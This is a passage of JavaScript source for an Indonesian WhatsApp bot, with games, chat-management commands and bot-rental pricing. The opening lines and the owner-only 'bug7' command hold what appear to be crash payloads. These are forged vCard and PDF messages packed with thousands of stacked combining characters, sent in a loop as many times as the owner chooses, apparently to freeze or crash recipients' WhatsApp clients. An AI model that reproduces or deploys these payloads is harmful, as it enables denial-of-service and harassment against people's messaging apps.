̴͔̠̣̯͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"
 }
   }
}
bacito(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ VCARD`, main)
}
}
break
//=================================================//
case 'bug7': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/pdf",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }
   }
}
bacot(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ PDF`, main)
}
}
break

        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            hisoka.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
	    if (!isCreator) return
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ 13k Per Group via E-Walet 1 Month\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6288292024190 (Owner)\n\nDonate For Me : \n\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Paypal : https://www.paypal.me/Cakhaho\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
            }
            break
            case 'sc': {
                m.reply('Cari Script???\nAmbil di YouTube gweh \nhttps://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w')
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    hisoka.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    hisoka.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    hisoka.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    hisoka.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    hisoka.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    hisoka.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    hisoka.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await hisoka.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await hisoka.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    hisoka.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
